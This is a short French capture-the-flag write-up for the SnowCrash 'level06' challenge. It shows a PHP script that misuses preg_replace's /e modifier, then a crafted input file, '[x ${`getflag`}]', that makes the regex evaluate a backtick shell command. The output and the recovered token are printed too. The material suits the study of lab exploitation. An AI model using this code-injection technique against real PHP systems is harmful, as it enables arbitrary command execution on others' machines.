# Level 06

En arrivant sur le level, nous voyons un executable, et un fichier .php.

```bash
cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

En lisant les regex, nous voyons que le fichier va chercher les strings avec [x ...] et va les remplacer par le resultat de la fonction y.
La fonction y va remplacer les '.' par ' x ' et les '@' par ' y'.
Nous pouvons utiliser le fait que /e execute le resultat de la regex pour executer du code php.
(entourer une commande de ` permet de l'executer)

```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/php_exploit
level06@SnowCrash:~$ ./level06 /tmp/php_exploit
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
